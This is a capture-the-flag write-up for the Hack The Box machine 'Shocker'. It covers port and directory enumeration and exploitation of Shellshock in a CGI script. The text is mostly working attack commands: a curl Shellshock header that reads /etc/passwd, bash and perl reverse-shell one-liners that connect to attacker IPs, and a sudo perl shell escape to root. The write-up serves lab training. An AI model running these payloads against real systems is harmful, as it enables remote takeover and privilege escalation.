# Shocker HTB, IP 10.10.10.56

# Initial Enumeration

**1.nmap -sC -sV 10.10.10.56**


**2../nmapAutomator.sh 10.10.10.56 All**



**3. Dirb/ Gobuster**

**dirb http://10.10.10.56/cgi-bin -X .sh,.php,.cgi**
 
  The **cgi-bin** directory is a directory stored on the server which compiles and executes (typically) perl and shell scripts, rather than store them as basic HTML docs and whatnot.
 
  
  
I found a user.sh. We will try to exploit shellshock vulnerability on the server.
CGI runs bash as their default request handler and this attack does not require any authentication that’s why most of the attack is taken place on CGI pages to exploit this vulnerability.

------------------------------------------------------------------------------------------------------------------------------------------
# Port Enumeration

**1.Enumerating on port 80**




**Image enumeration**
**wget http://10.10.10.56/bug.jpg**
**exiftool bug.jpg**


Nothing here!

## 1.Exploit shellshock with curl
 
1.  **curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh**

2.  **curl -H ‘User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.3/4488 0>&1’ http://10.10.10.56:80/cgi-bin/user.sh**


## 2.Exploit shellshock with python script

**searchsploit shellshock**
 
We get a lot of results back but the one we’re interested in is 34900.py, an Apache mod_cgi script. Before we run it let’s verify it’s a legitimate script and the parameters we need to include by reading it on the exploit db. Since it looks good let’s go ahead and copy the exploit into our root folder and try to execute it.
 
 
 **python Desktop/cgi.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.24 lport=1337 pages=/cgi-bin/user.sh**
 


**Notes:**
**Kill process in case of sockets in use**


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sudo netstat -nlp | grep 8069
ps -aux
tcp        0      0 0.0.0.0:8069            0.0.0.0:*               LISTEN      10869/python2    
sudo kill -9 10869
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


 
 
**Interactive shell**
**python3 -c 'import pty; pty.spawn("/bin/bash")'**
In case that I wont be able to get an interactive shell I could get a reverse shell in order to be more stable.


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ bash -i >& /dev/tcp/10.10.14.15/8888 0>&1
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


**Attacker:**
nc -lvp 8888


----------------------------------------------------------------------------------------------------------------------------------------------
# Privilege escalation
**sudo -l**
 
 


## 1.GTFobins Perl
Linux for Perl resource:https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 perl -e 'exec "/bin/sh";'
 perl -e 'exec "tail /etc/passwd";'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


 
 cat root/root.txt
 
 
## 2.Perl Reverse shell - one -Liner

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 $ sudo perl -e 'use Socket;$i="10.10.14.15";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

 or

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 perl -e 'use Socket;$i="192.168.29.157";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Attacker:
nc -lvp 1234

 root.txt
 
